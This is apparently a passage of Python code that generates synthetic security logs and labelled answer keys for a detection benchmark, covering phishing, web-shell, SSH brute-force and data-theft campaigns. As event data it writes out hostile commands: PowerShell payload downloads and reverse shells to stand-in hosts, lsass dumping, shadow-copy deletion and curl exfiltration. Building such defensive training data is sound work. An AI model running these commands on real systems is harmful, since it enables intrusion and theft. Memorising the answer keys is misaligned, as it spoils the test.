    # M15 registry Run key persistence -> MEDIUM (nwong; SID = nwong's real SID)
    b.hint("biz", who=["nwong"])
    d = dt(b, 2026, 11, 11, 12, 40)
    runbin = r"C:\Users\Public\svc_updater.exe"
    runkey = ("HKU\\" + A.USERS["nwong"]["sid"] +
              r"\Software\Microsoft\Windows\CurrentVersion\Run\SvcUpdater")
    r = EV.sm13(b, d, "WKS-SALES-22", runbin, runkey, runbin, "nwong")
    b.add_case("attack_mapping", P("attack_mapping"), [r],
               "medium", True, ["T1547.001"],
               [ioc("registry", runkey), ioc("file", runbin)],
               "เขียนค่า Run key ใน hive ของ nwong (SID ตรงกับ environment.json) ให้รันไฟล์ใน C:\\Users\\Public ตอนล็อกออน = Registry Run Keys persistence")


# ======================================================================
# CORRELATION CASES
# ======================================================================

def correlation_cases(b):
    e = b.ent

    # C1 C2 confirmed by IPS -> HIGH (rlee). Vendor severity only LOW:
    #    a true positive with a weak alert.
    b.hint("any", who=["rlee"])
    h = home("rlee")
    d = dt(b, 2026, 11, 11, 19, 5)
    c2ip = A.alloc_ext("c2")
    c2dom = f"api-{e._hex(4)}.telemetry-node.example"
    r1 = EV.sm3(b, d, h, r"C:\Users\Public\netmon_svc.exe", "rlee",
                A.ip(h), b.rng.randint(49152, 65535), c2ip, 443,
                dst_host=c2dom)
    r2 = EV.pan_threat(b, dt(b, 2026, 11, 11, 19, 5), "PA-CORE", "spyware",
                       A.ip(h), c2ip, "ssl", "alert", c2dom,
                       "Suspicious TLS Beacon Interval", 0,
                       "command-and-control", "low", 0,
                       suser="corp\\rlee", inbound=False)
    b.add_case("correlation", P("correlation"), [r1, r2],
               "high", True, ["T1071.001"],
               [ioc("ip", c2ip), ioc("domain", c2dom)],
               f"Sysmon network connect จาก netmon_svc.exe ใน C:\\Users\\Public ({h}) + PAN-OS spyware alert (vendor ให้แค่ low) ไปปลายทางเดียวกันเป็นรอบ = C2 beacon จริงแม้ alert อ่อน ปรับ high เชื่อมด้วย host และ dst_ip",
               correlation_keys=[f"host:{h}", f"dst_ip:{c2ip}"])

    # C2 phishing -> execution chain -> HIGH (apatel). WildFire-like verdict HIGH.
    b.hint("biz", who=["apatel"])
    d = dt(b, 2026, 11, 11, 9, 20)
    pdom = f"mail-{e._hex(4)}.login-portal.example"
    pip = A.alloc_ext("phish")
    enc = enc_ps(f"IEX (New-Object Net.WebClient).DownloadString('hxxps://{defang(pdom)}/inv')")
    r1 = EV.sm1(b, d, "WKS-HR-03", PS,
                'powershell -nop -enc %s' % enc, "apatel", WORD,
                '"WINWORD.EXE" /n invoice.docm', integrity="Medium")
    r2 = EV.bind_q(b, d, "WKS-HR-03", pdom, "A")
    r3 = EV.pan_traffic(b, d, "PA-CORE", "end", "WKS-HR-03", pip, "ssl",
                        "allow", 443, suser="corp\\apatel")
    r4 = EV.pan_threat(b, dt(b, 2026, 11, 11, 9, 4), "PA-CORE", "virus", pip,
                       "SRV-MAIL01", "smtp", "alert", "invoice.docm",
                       "Office Macro Downloader Variant", 0, "virus", "high", 0,
                       inbound=True, dport=25)
    b.add_case("correlation", P("correlation"), [r4, r1, r2, r3],
               "high", True, ["T1566.001", "T1204.002", "T1059.001"],
               [ioc("domain", pdom), ioc("ip", pip)],
               "ไฟล์แนบ invoice.docm ถูก PAN-OS ตรวจเป็น macro downloader (high) แล้ว WINWORD.EXE spawn powershell -enc (decode ได้เป็น DownloadString จากโดเมนเดียวกัน) resolve และต่อออก 443 = Spearphishing Attachment + User Execution + PowerShell เชื่อมด้วย host/กระบวนการพ่อ-ลูก",
               correlation_keys=["host:WKS-HR-03", "parent:WINWORD.EXE"])

    # C3 lateral movement SMB -> MEDIUM (pmali -> SRV-APP01; SMB client = System PID 4)
    b.hint("biz", who=["pmali"])
    h = home("pmali")
    d = dt(b, 2026, 11, 11, 15, 15)
    r3 = EV.sm3(b, d, h, "System", "SYSTEM",
                A.ip(h), b.rng.randint(49152, 65535),
                A.ip("SRV-APP01"), 445, dst_host=A.fqdn("SRV-APP01"), tag="")
    r2 = EV.cp(b, d, "Accept", "Accept", A.ip(h), A.ip("SRV-APP01"),
               445, rule="Internal-SMB")
    r1, lid = EV.sec_4624(b, d, "SRV-APP01", "pmali", 3, A.ip(h),
                          h, auth="NTLM")
    r4 = EV.sec_4688(b, dt(b, 2026, 11, 11, 15, 17), "SRV-APP01", "pmali",
                     CMD, r"cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1736 2>&1",
                     r"C:\Windows\System32\wbem\WmiPrvSE.exe", integrity="High",
                     parent_tag="dcom")
    b.add_case("correlation", P("correlation"), [r1, r2, r3, r4],
               "medium", True, ["T1021.002", "T1047"],
               [],
               f"ล็อกออน network NTLM ของ pmali (ผู้ใช้ทั่วไป ไม่ใช่แอดมิน) เข้า SRV-APP01 จาก {h} + Check Point allow 445 + Sysmon (System PID 4) ต่อ 445 แล้ว WmiPrvSE spawn cmd ที่ redirect ผลไป ADMIN$ = SMB/WMI remote execution เชื่อมด้วยคู่โฮสต์",
               correlation_keys=[f"src:{h}", "dst:SRV-APP01"])


# ======================================================================
# CAMPAIGNS (multi-stage, tied to real hosts; ransomware ONCE in CMP-001)
# Each campaign is ONE time group: stages keep their relative order/spacing.
# ======================================================================

def campaigns(b):
    e = b.ent

    # ---- CMP-001: WKS-FIN-07 -> SRV-FILE01, phishing to ransomware ----
    c2ip = A.alloc_ext("cmp1_c2"); c2dom = f"cdn-{e._hex(4)}.update-check.example"
    exdom = f"up-{e._hex(4)}.cloud-share.example"; exip = A.alloc_ext("cmp1_ex")
    arch = r"C:\Users\Public\fin_archive.7z"
    dumpf = r"C:\ProgramData\lsa.dmp"
    implant = r"C:\Users\Public\svc_host32.exe"
    stages = []
    b.hint("biz", who=["jsmith", "administrator@SRV-FILE01", "WKS-FIN-07", "SRV-FILE01"])
    b.begin_group()
    d = dt(b, 2026, 11, 11, 9, 15)
    enc = enc_ps(f"(New-Object Net.WebClient).DownloadFile('hxxps://{defang(c2dom)}/s.bin','C:\\Users\\Public\\svc_host32.exe'); Start-Process C:\\Users\\Public\\svc_host32.exe")
    s1 = EV.sm1(b, d, "WKS-FIN-07", PS, "powershell -nop -w hidden -enc %s" % enc,
                "jsmith", WORD, '"WINWORD.EXE" /n Q4-budget.docm',
                integrity="Medium", tag="cmp1-ps")
    s1b = EV.sm11(b, d + datetime.timedelta(milliseconds=2400), "WKS-FIN-07", PS, implant, "jsmith", tag="cmp1-ps")
    stages.append({"stage": 1, "name_th": "Initial Access / Execution",
                   "refs": [s1, s1b], "severity": "high", "host": "WKS-FIN-07",
                   "techniques": ["T1566.001", "T1204.002", "T1059.001", "T1105"],
                   "iocs": [ioc("file", implant)],
                   "rationale_th": "เปิดไฟล์แนบ Q4-budget.docm แล้ว WINWORD spawn powershell -enc (decode ได้เป็นการดาวน์โหลด svc_host32.exe) และ powershell ตัวเดียวกันเขียนไฟล์ลง C:\\Users\\Public = phishing attachment + ingress"})
    d = dt(b, 2026, 11, 11, 9, 25)
    s2c = EV.sm1(b, d, "WKS-FIN-07", implant, implant, "jsmith", PS,
                 "powershell -nop -w hidden -enc ...", integrity="Medium",
                 company="", tag="cmp1-implant", parent_tag="cmp1-ps")
    s2a = EV.sm3(b, d + datetime.timedelta(milliseconds=1800), "WKS-FIN-07", implant, "jsmith",
                 A.ip("WKS-FIN-07"), b.rng.randint(49152, 65535), c2ip, 443,
                 dst_host=c2dom, tag="cmp1-implant")
    s2b = EV.pan_threat(b, d, "PA-CORE", "spyware", A.ip("WKS-FIN-07"), c2ip,
                        "ssl", "alert", c2dom, "Newly Registered Domain Access",
                        0, "command-and-control", "informational", 0,
                        suser="corp\\jsmith", inbound=False)
    stages.append({"stage": 2, "name_th": "Command and Control",
                   "refs": [s2c, s2a, s2b], "severity": "high", "host": "WKS-FIN-07",
                   "techniques": ["T1071.001"],
                   "iocs": [ioc("ip", c2ip), ioc("domain", c2dom)],
                   "correlation_keys": ["host:WKS-FIN-07", f"dst_ip:{c2ip}"],
                   "rationale_th": "svc_host32.exe (ลูกของ powershell ขั้น 1, ProcessGuid ต่อกัน) beacon ออก 443 ไปโดเมนใหม่ PAN-OS ให้แค่ informational แต่บริบทคือ C2"})
    # (v4) v3 CAE standalone task on WKS-FIN-07 is now an explicit stage
    d = dt(b, 2026, 11, 11, 9, 41)
    tbin = r"C:\Users\Public\wupd.exe"
    s3 = EV.sec_4698(b, d, "WKS-FIN-07", "\\SystemUpdateCheck", "jsmith", tbin,
                     "/silent")
    stages.append({"stage": 3, "name_th": "Persistence (Scheduled Task)",
                   "refs": [s3], "severity": "medium", "host": "WKS-FIN-07",
                   "techniques": ["T1053.005"], "iocs": [ioc("file", tbin)],
                   "rationale_th": "jsmith สร้าง scheduled task ที่ root ชี้ไฟล์ใน C:\\Users\\Public ระหว่างแคมเปญบนเครื่องเดียวกัน = Scheduled Task persistence ของ CMP-001"})
    d = dt(b, 2026, 11, 11, 10, 5)
    lp = b.lsass_pid("WKS-FIN-07")
    s4a = EV.sm1(b, d, "WKS-FIN-07", r"C:\Windows\System32\rundll32.exe",
                 f"rundll32 comsvcs.dll, MiniDump {lp} {dumpf} full", "jsmith",
                 implant, implant, integrity="High", tag="cmp1-dump",
                 parent_tag="cmp1-implant")
    s4b = EV.sm10(b, d + datetime.timedelta(milliseconds=1600), "WKS-FIN-07", r"C:\Windows\System32\rundll32.exe", LSASS,
                  "0x1fffff", "jsmith", tag="cmp1-dump")
    s4c = EV.sm11(b, d + datetime.timedelta(milliseconds=3900), "WKS-FIN-07", r"C:\Windows\System32\rundll32.exe", dumpf,
                  "jsmith", tag="cmp1-dump")
    stages.append({"stage": 4, "name_th": "Credential Access",
                   "refs": [s4a, s4b, s4c], "severity": "critical",
                   "host": "WKS-FIN-07", "techniques": ["T1003.001"],
                   "iocs": [ioc("file", dumpf)],
                   "rationale_th": f"comsvcs MiniDump PID {lp} (= lsass ของ WKS-FIN-07) ดัมพ์ lsass โดยมี svc_host32.exe เป็น parent"})
    d = dt(b, 2026, 11, 11, 10, 20)
    s5 = EV.sec_4688(b, d, "WKS-FIN-07", "jsmith",
                     r"C:\Windows\System32\net.exe",
                     'net group "Domain Admins" /domain', CMD)
    stages.append({"stage": 5, "name_th": "Discovery",
                   "refs": [s5], "severity": "medium", "host": "WKS-FIN-07",
                   "techniques": ["T1069.002"],
                   "rationale_th": "สำรวจสมาชิก Domain Admins"})
    d = dt(b, 2026, 11, 11, 10, 40)
    s6b = EV.sm3(b, d, "WKS-FIN-07", "System", "SYSTEM",
                 A.ip("WKS-FIN-07"), b.rng.randint(49152, 65535),
                 A.ip("SRV-FILE01"), 445, dst_host=A.fqdn("SRV-FILE01"), tag="")
    s6a, lid = EV.sec_4624(b, d, "SRV-FILE01", "administrator", 3,
                           A.ip("WKS-FIN-07"), "WKS-FIN-07", auth="NTLM")
    stages.append({"stage": 6, "name_th": "Lateral Movement",
                   "refs": [s6a, s6b], "severity": "high", "host": "SRV-FILE01",
                   "techniques": ["T1021.002", "T1078.002"],
                   "correlation_keys": ["src:WKS-FIN-07", "dst:SRV-FILE01"],
                   "rationale_th": "ใช้ credential administrator ที่ขโมยมา (NTLM) จาก WKS-FIN-07 เคลื่อนที่ด้านข้างผ่าน SMB ไป SRV-FILE01"})
    d = dt(b, 2026, 11, 11, 11, 0)
    s7 = EV.sm1(b, d, "SRV-FILE01", r"C:\Program Files\7-Zip\7z.exe",
                f'7z a -p{e._hex(6)} {arch} D:\\Shares\\Finance\\*', "administrator",
                CMD, "cmd.exe", integrity="High", company="Igor Pavlov",
                product="7-Zip")
    stages.append({"stage": 7, "name_th": "Collection / Staging",
                   "refs": [s7], "severity": "high", "host": "SRV-FILE01",
                   "techniques": ["T1560.001", "T1074.001"],
                   "iocs": [ioc("file", arch)],
                   "rationale_th": "บีบอัดไฟล์แชร์ Finance เป็น .7z มีรหัสผ่าน = Archive Collected Data และ staging"})
    d = dt(b, 2026, 11, 11, 11, 20)
    s8b = EV.bind_q(b, d, "SRV-FILE01", exdom, "A")
    s8 = EV.squid(b, d, "SRV-FILE01", "POST", f"https://{exdom}/u", "administrator",
                  512, exip, content_type="application/json", result="TCP_MISS/200")
    stages.append({"stage": 8, "name_th": "Exfiltration",
                   "refs": [s8, s8b], "severity": "high", "host": "SRV-FILE01",
                   "techniques": ["T1567.002"],
                   "iocs": [ioc("domain", exdom), ioc("ip", exip)],
                   "rationale_th": "อัปโหลด archive ไป cloud-share ภายนอก = Exfiltration to Cloud Storage"})
    note = r"D:\Shares\Finance\RESTORE_FILES.txt"
    refs9 = [EV.sec_4688(b, dt(b, 2026, 11, 11, 11, 40), "SRV-FILE01",
                         "administrator", r"C:\Windows\System32\vssadmin.exe",
                         "vssadmin delete shadows /all /quiet", CMD)]
    for i in range(4):
        dd = dt(b, 2026, 11, 11, 11, 41, s=i * 3 + 1 + b.rng.randint(0, 2))
        refs9.append(EV.sm11(b, dd, "SRV-FILE01", implant,
                     f"D:\\Shares\\Finance\\doc{i}.xlsx.locked", "administrator",
                     tag="cmp1-ransom"))
    refs9.append(EV.sm11(b, dt(b, 2026, 11, 11, 11, 42), "SRV-FILE01",
                 implant, note, "administrator", tag="cmp1-ransom"))
    stages.append({"stage": 9, "name_th": "Impact (Ransomware)",
                   "refs": refs9, "severity": "critical", "host": "SRV-FILE01",
                   "techniques": ["T1486", "T1490"],
                   "iocs": [ioc("file", note)],
                   "rationale_th": "ลบ Volume Shadow Copies แล้วเข้ารหัสไฟล์เป็น .locked พร้อม ransom note = Data Encrypted for Impact + Inhibit System Recovery (เหตุการณ์แรนซัมแวร์เพียงจุดเดียวในชุดข้อมูล)"})
    b.add_campaign("CMP-001", "Phishing สู่ Ransomware บน WKS-FIN-07 → SRV-FILE01",
                   "แคมเปญหลัก: เข้าถึงผ่านฟิชชิ่งที่ WKS-FIN-07 วาง persistence ดัมพ์ credential เคลื่อนที่ด้านข้างไป SRV-FILE01 ขโมยข้อมูลแล้วปล่อยแรนซัมแวร์",
                   stages)
    b.end_group()

    # ---- CMP-002: DMZ web server SRV-WEB01 compromise ----
    w_c2 = A.alloc_ext("cmp2_c2"); attacker = A.alloc_ext("cmp2_atk")
    wshell = r"C:\inetpub\wwwroot\uploads\sync.aspx"
    stages = []
    b.hint("any", who=["svc_web@SRV-WEB01", "SRV-WEB01"])
    b.begin_group()
    d = dt(b, 2026, 11, 10, 22, 10)
    EV.web_inbound(b, d - datetime.timedelta(milliseconds=350), attacker, "SRV-WEB01")
    w1 = EV.f5(b, d, [("policy_name", "prod_web_asm"),
                      ("violations", "Attack signature detected"),
                      ("sig_names", "OS Command Injection"),
                      ("request_status", "alerted"),
                      ("ip_client", attacker), ("method", "POST"),
                      ("uri", "/upload.aspx"), ("response_code", "200"),
                      ("severity", "Error")])
    stages.append({"stage": 1, "name_th": "Initial Access",
                   "refs": [w1], "severity": "high", "host": "SRV-WEB01",
                   "techniques": ["T1190"], "iocs": [ioc("ip", attacker)],
                   "rationale_th": "F5 ASM เห็น command injection ที่ /upload.aspx แต่ policy อยู่โหมด alerted (ผ่าน, 200) = Exploit Public-Facing Application สำเร็จ"})
    d = dt(b, 2026, 11, 10, 22, 12)
    w2 = EV.sm11(b, d, "SRV-WEB01", W3WP, wshell, "svc_web", tag="iis")
    stages.append({"stage": 2, "name_th": "Persistence (Web Shell)",
                   "refs": [w2], "severity": "high", "host": "SRV-WEB01",
                   "techniques": ["T1505.003"], "iocs": [ioc("file", wshell)],
                   "rationale_th": "w3wp.exe เขียน sync.aspx ลง wwwroot = Web Shell"})
    d = dt(b, 2026, 11, 10, 22, 15)
    w3 = EV.sm1(b, d, "SRV-WEB01", CMD, "cmd /c whoami /all & net user", "svc_web",
                W3WP, 'c:\\windows\\system32\\inetsrv\\w3wp.exe -ap "DefaultAppPool"',
                integrity="High", company="Microsoft Corporation",
                tag="cmp2-cmd", parent_tag="iis")
    stages.append({"stage": 3, "name_th": "Execution / Discovery",
                   "refs": [w3], "severity": "medium", "host": "SRV-WEB01",
                   "techniques": ["T1059.003", "T1033"],
                   "rationale_th": "web shell (w3wp ProcessGuid เดียวกับขั้น 2) รัน cmd whoami/net user = Windows Command Shell + System Owner/User Discovery"})
    d = dt(b, 2026, 11, 10, 22, 30)
    w4a = EV.sm1(b, d, "SRV-WEB01", PS,
                 "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('%s',4444)\"" % w_c2,
                 "svc_web", CMD, "cmd /c whoami /all & net user", integrity="High",
                 tag="cmp2-ps", parent_tag="cmp2-cmd")
    w4b = EV.sm3(b, d, "SRV-WEB01", PS, "svc_web", A.ip("SRV-WEB01"),
                 b.rng.randint(49152, 65535), w_c2, 4444, tag="cmp2-ps")
    stages.append({"stage": 4, "name_th": "Command and Control",
                   "refs": [w4a, w4b], "severity": "high", "host": "SRV-WEB01",
                   "techniques": ["T1095", "T1059.001"], "iocs": [ioc("ip", w_c2)],
                   "correlation_keys": ["host:SRV-WEB01", f"dst_ip:{w_c2}"],
                   "rationale_th": "reverse shell raw TCP 4444 ออกจาก SRV-WEB01 (powershell ตัวเดียวกันกับ EID 3) = Non-Application Layer Protocol"})
    b.add_campaign("CMP-002", "การยึดเว็บเซิร์ฟเวอร์ DMZ (SRV-WEB01)",
                   "โจมตีแอปพลิเคชันสาธารณะบน SRV-WEB01 วาง web shell และเปิด reverse shell",
                   stages)
    b.end_group()

    # ---- CMP-003: Linux intrusion (lnx-web01) ----
    l_atk = A.alloc_ext("cmp3_atk")
    ldom = f"mirror-{e._hex(4)}.pkg-mirror.example"; l_dl = A.alloc_ext("cmp3_dl")
    stages = []
    refs = []
    b.hint("any", who=["root@lnx-web01", "lnx-web01"])
    b.begin_group()
    for i in range(5):
        dd = b.tj(dt(b, 2026, 11, 11, 4, 2, s=10 + i * 3 + b.rng.randint(0, 2)))
        refs.append(b.add_line("auth", EV._E.syslog_rfc3164(
            dd, "lnx-web01", "sshd", 2200 + i,
            f"Failed password for root from {l_atk} port {40000 + i * 7} ssh2"), dt=dd))
    refs.append(EV.fgt(b, dt(b, 2026, 11, 11, 4, 2, s=31), "FGT-EDGE", "utm", "ips",
                       "alert", l_atk, A.ip("lnx-web01"), 22, "detected", "SSH",
                       "SSH", "Network.Service", srccountry="United States",
                       outbound=False, logid="0419016384",
                       extra='attack="SSH.Connection.Brute.Force" severity="high" '
                             'crlevel="high" attackid=19541 direction="incoming"'))
    dok = b.tj(dt(b, 2026, 11, 11, 4, 3))
    refs.append(b.add_line("auth", EV._E.syslog_rfc3164(
        dok, "lnx-web01", "sshd", 2300,
        f"Accepted password for root from {l_atk} port 40041 ssh2"), dt=dok))
    stages.append({"stage": 1, "name_th": "Initial Access",
                   "refs": refs, "severity": "high", "host": "lnx-web01",
                   "techniques": ["T1110.001"], "iocs": [ioc("ip", l_atk)],
                   "rationale_th": "SSH Failed password หลายครั้งต่อ root จาก IP เดียว (FortiGate IPS แจ้ง brute force) แล้ว Accepted = brute-force สำเร็จ"})
    d = b.tj(dt(b, 2026, 11, 11, 4, 5))
    l2 = b.add_lines("auditd", EV._E.auditd(
        d, 91001, syscall=59, success="yes", exit_=0,
        a0='"/usr/bin/curl"', ppid=2301, pid=5120, auid=0, uid=0, euid=0,
        ses=3, tty="pts/0", comm="curl", exe="/usr/bin/curl", key="exec",
        execve_argv=["/usr/bin/curl", "-sO", f"http://{ldom}/x.sh"],
        cwd="/tmp", proctitle=f"curl -sO http://{ldom}/x.sh"), dt=d)
    l2b = EV.bind_q(b, d + datetime.timedelta(milliseconds=140), "lnx-web01", ldom, "A")
    l2c = EV.fgt(b, d + datetime.timedelta(milliseconds=420), "FGT-EDGE", "utm", "webfilter", "notice", "lnx-web01",
                 l_dl, 80, "passthrough", "HTTP", "HTTP.BROWSER", "Web.Client",
                 extra=f'hostname="{ldom}" url="/x.sh" cat=90 '
                       f'catdesc="Newly Observed Domain" crlevel="low"')
    stages.append({"stage": 2, "name_th": "Execution / Ingress Tool Transfer",
                   "refs": [l2, l2b, l2c], "severity": "high", "host": "lnx-web01",
                   "techniques": ["T1105", "T1059.004"],
                   "iocs": [ioc("domain", ldom)],
                   "rationale_th": "curl ดึงสคริปต์จาก mirror ภายนอก (FortiGate จัดเป็น Newly Observed Domain ระดับ low เท่านั้น) = Ingress Tool Transfer + Unix Shell"})
    d = b.tj(dt(b, 2026, 11, 11, 4, 7))
    l3 = b.add_line("syslog", EV._E.syslog_rfc3164(
        d, "lnx-web01", "crontab", 5130,
        "(root) REPLACE (root) new crontab"), dt=d)
    stages.append({"stage": 3, "name_th": "Persistence (Cron)",
                   "refs": [l3], "severity": "medium", "host": "lnx-web01",
                   "techniques": ["T1053.003"],
                   "rationale_th": "root แทนที่ crontab ทันทีหลังดาวน์โหลด x.sh = Scheduled Task/Job: Cron"})
    d = b.tj(dt(b, 2026, 11, 11, 4, 20))
    l4 = b.add_lines("auditd", EV._E.auditd(
        d, 91002, syscall=59, success="yes", exit_=0,
        a0='"/usr/bin/curl"', ppid=5130, pid=5210, auid=0, uid=0, euid=0,
        ses=3, tty="(none)", comm="curl", exe="/usr/bin/curl", key="exec",
        execve_argv=["/usr/bin/curl", "-T", "/tmp/data.tar.gz",
                     f"https://{ldom}/u"],
        cwd="/tmp", proctitle=f"curl -T /tmp/data.tar.gz https://{ldom}/u"), dt=d)
    stages.append({"stage": 4, "name_th": "Exfiltration",
                   "refs": [l4], "severity": "high", "host": "lnx-web01",
                   "techniques": ["T1048.002"],
                   "rationale_th": "curl -T อัปโหลด tarball ผ่าน HTTPS ไปโดเมนภายนอกของผู้โจมตีตัวเดียวกับที่ใช้ดาวน์โหลดเครื่องมือ (ไม่ใช่ cloud storage) = Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"})
    b.add_campaign("CMP-003", "การบุกรุกเซิร์ฟเวอร์ Linux (lnx-web01)",
                   "SSH brute-force เข้า lnx-web01 ดาวน์โหลดเครื่องมือ ตั้ง cron และ exfiltrate",
                   stages)
    b.end_group()

    # ---- CMP-004: dev workstation foothold -> svc_sql data theft ----
    # (v4) the WKS-DEV-11 reverse shell is now stage 1, so the origin of the
    # svc_sql logon is explained inside the campaign.
    s_ex = A.alloc_ext("cmp4_ex"); sdom = f"bak-{e._hex(4)}.cloud-share.example"
    expfile = r"C:\Temp\sales_export.bak"
    rev = A.alloc_ext("revshell")
    stages = []
    b.hint("night", who=["ddeep", "svc_sql", "WKS-DEV-11", "SRV-SQL01"])
    b.begin_group()
    d = dt(b, 2026, 11, 12, 1, 40)
    enc = enc_ps(f"$c=New-Object Net.Sockets.TCPClient('{rev}',4444)")
    q0a = EV.sm1(b, d, "WKS-DEV-11", PS,
                 "powershell -nop -w hidden -enc %s" % enc,
                 "ddeep", CMD, "cmd /c start", integrity="Medium", tag="cmp4-ps")
    q0b = EV.sm3(b, d, "WKS-DEV-11", PS, "ddeep", A.ip("WKS-DEV-11"),
                 b.rng.randint(49152, 65535), rev, 4444, tag="cmp4-ps")
    stages.append({"stage": 1, "name_th": "Execution / Command and Control",
                   "refs": [q0a, q0b], "severity": "high", "host": "WKS-DEV-11",
                   "techniques": ["T1059.001", "T1095"], "iocs": [ioc("ip", rev)],
                   "correlation_keys": ["host:WKS-DEV-11", f"dst_ip:{rev}"],
                   "rationale_th": "PowerShell -enc (decode = TCPClient ไป IP ภายนอกพอร์ต 4444) บน WKS-DEV-11 ตอนกลางคืน และ process เดียวกันต่อออก 4444 = reverse shell (T1095)"})
    d = dt(b, 2026, 11, 12, 2, 10)
    q1, lid = EV.sec_4624(b, d, "SRV-SQL01", "svc_sql", 3, A.ip("WKS-DEV-11"),
                          "WKS-DEV-11", auth="NTLM")
    stages.append({"stage": 2, "name_th": "Valid Accounts",
                   "refs": [q1], "severity": "medium", "host": "SRV-SQL01",
                   "techniques": ["T1078.002"],
                   "correlation_keys": ["src:WKS-DEV-11", "dst:SRV-SQL01"],
                   "rationale_th": "30 นาทีหลัง reverse shell บัญชีบริการ svc_sql ล็อกออน NTLM จาก WKS-DEV-11 (เวิร์กสเตชันที่ถูกยึด ไม่ใช่เครื่องของบริการ) = Valid Accounts: Domain Accounts"})
    d = dt(b, 2026, 11, 12, 2, 15)
    q2 = EV.sec_4688(b, d, "SRV-SQL01", "svc_sql",
                     r"C:\Program Files\Microsoft SQL Server\sqlcmd.exe",
                     'sqlcmd -Q "BACKUP DATABASE Sales TO DISK=\'C:\\Temp\\sales_export.bak\'"',
                     CMD)
    stages.append({"stage": 3, "name_th": "Collection",
                   "refs": [q2], "severity": "high", "host": "SRV-SQL01",
                   "techniques": ["T1005"], "iocs": [ioc("file", expfile)],
                   "rationale_th": "ส่งออกฐานข้อมูล Sales เป็นไฟล์ .bak บนเครื่อง = Data from Local System"})
    d = dt(b, 2026, 11, 12, 2, 25)
    q3b = EV.bind_q(b, d, "SRV-SQL01", sdom, "A")
    q3 = EV.squid(b, d, "SRV-SQL01", "POST", f"https://{sdom}/u", "svc_sql",
                  256, s_ex, content_type="application/json", result="TCP_MISS/200")
    q3c = EV.fgt(b, d, "FGT-EDGE", "utm", "dlp", "information", A.PROXY_IP,
                 s_ex, 443, "log-only", "HTTPS", "HTTPS.BROWSER", "Storage.Backup",
                 logid="0954024576",
                 extra=f'filtertype="file-size" filteridx=1 dlpextra="upload>1MB" '
                       f'hostname="{sdom}" crlevel="low" profile="dlp-monitor"')
    stages.append({"stage": 4, "name_th": "Exfiltration",
                   "refs": [q3, q3b, q3c], "severity": "high", "host": "SRV-SQL01",
                   "techniques": ["T1567.002"],
                   "iocs": [ioc("domain", sdom), ioc("ip", s_ex)],
                   "rationale_th": "อัปโหลดไฟล์ backup ไป cloud-share ภายนอก (DLP ของ FortiGate แค่ log ระดับ information) = Exfiltration to Cloud Storage"})
    b.add_campaign("CMP-004", "ยึดเครื่องนักพัฒนาแล้วขโมยข้อมูลด้วยบัญชีบริการ (WKS-DEV-11 → SRV-SQL01)",
                   "reverse shell บน WKS-DEV-11 ใช้ credential ของ svc_sql ส่งออกฐานข้อมูลและ exfiltrate นอกเวลางาน",
                   stages)
    b.end_group()


def build_all(b):
    benign_cases(b)
    benign_extra(b)
    malicious_cases(b)
    correlation_cases(b)
    campaigns(b)
    mix_and_decoys(b)
    dmz_benign(b)


def benign_extra(b):
    """Additional benign cases (label balance + benign coverage of event
    types that would otherwise appear only in malicious cases)."""
    e = b.ent

    def ben(refs, note, task="triage_severity", iocs=None, sev="info"):
        b.add_case(task, P(task), refs, sev, False, [], iocs or [], note)

    # DC replication / machine account logon
    b.hint("any")
    d = dt(b, 2026, 11, 10, 3, 2)
    r, lid = EV.sec_4624(b, d, "SRV-DC01", "SRV-APP01$", 3, A.ip("SRV-APP01"),
                         "SRV-APP01", auth="Kerberos")
    ben([r], "ล็อกออน network ด้วยบัญชีเครื่อง SRV-APP01$ (Kerberos) ไป DC = การสื่อสารของเครื่องในโดเมนปกติ")
    # normal signed DLL load
    b.hint("biz", who=["apatel"])
    d = dt(b, 2026, 11, 10, 9, 0)
    r = EV.sm7(b, d, "WKS-HR-03", WORD, r"C:\Windows\System32\msvcp140.dll",
               tag="apatel-word", user_sam="apatel")
    ben([r], "โหลด DLL ที่เซ็นโดย Microsoft (Signed=true, Valid) ลงใน WINWORD = ปกติ")
    # k8s configmap read by controller
    b.hint("any")
    d = dt(b, 2026, 11, 10, 6, 0)
    r = EV.k8s(b, d, "system:serviceaccount:kube-system:deployment-controller",
               ["system:serviceaccounts"], A.ip("k8s-cp01"), "get", "configmaps",
               "", "prod", "app-config", 200, "kube-controller-manager/v1.29.0",
               level="Request")
    ben([r], "controller อ่าน configmap ใน prod = การทำงานภายในของคลัสเตอร์ปกติ")

    # B1: password typo then success (4625 benign)
    b.hint("biz", who=["schan"])
    h = home("schan")
    d = dt(b, 2026, 11, 10, 8, 31)
    refs = [EV.sec_4625(b, d, h, "schan", 2, "127.0.0.1", h, user_exists=True,
                        auth="Negotiate"),
            EV.sec_4625(b, d + datetime.timedelta(seconds=b.rng.randint(5, 14)),
                        h, "schan", 2, "127.0.0.1", h, user_exists=True,
                        auth="Negotiate")]
    rr, _l = EV.sec_4624(b, d + datetime.timedelta(seconds=b.rng.randint(20, 40)),
                         h, "schan", 2)
    refs.append(rr)
    ben(refs, f"schan พิมพ์รหัสผ่านผิด 2 ครั้ง (interactive type 2 ที่เครื่องตัวเอง {h}, SubStatus 0xc000006a) แล้วล็อกออนสำเร็จภายในไม่ถึงนาที = พิมพ์ผิดปกติ ไม่ใช่ brute force ไม่มีเทคนิค ATT&CK", task="attack_mapping")

    # B2: driver/agent service install by SYSTEM (7045 benign)
    b.hint("any")
    d = dt(b, 2026, 11, 10, 11, 47)
    hh = "WKS-GEN-021"
    r1 = b.add_app_event(hh, 11707, d, "MsiInstaller",
                         "Product: Intel(R) Graphics Command Center (x64) -- Installation completed successfully.")
    r2 = EV.sys_7045(b, d, hh, "igfxCUIService2.0.0.0",
                     r"C:\Windows\System32\DriverStore\FileRepository\cui_dch.inf_amd64_5a8d2f\igfxCUIService.exe",
                     start_type="auto start", installer="SYSTEM")
    ben([r1, r2], "MsiInstaller ติดตั้งแพ็กเกจไดรเวอร์กราฟิก แล้ว SCM บันทึก 7045 บริการของไดรเวอร์ใน DriverStore ติดตั้งโดย SYSTEM (UserID S-1-5-18) = การอัปเดตไดรเวอร์ปกติ")

    # B3: proxy policy block of a category (TCP_DENIED benign, policy)
    b.hint("biz", who=["bwong"])
    h = home("bwong")
    d = dt(b, 2026, 11, 10, 12, 20)
    sdom = "video-stream.example"
    r1 = EV.squid(b, d, h, "CONNECT", f"{sdom}:443", "bwong", 0,
                  A.alloc_ext("legit_" + sdom, noise=True), result="TCP_DENIED/403")
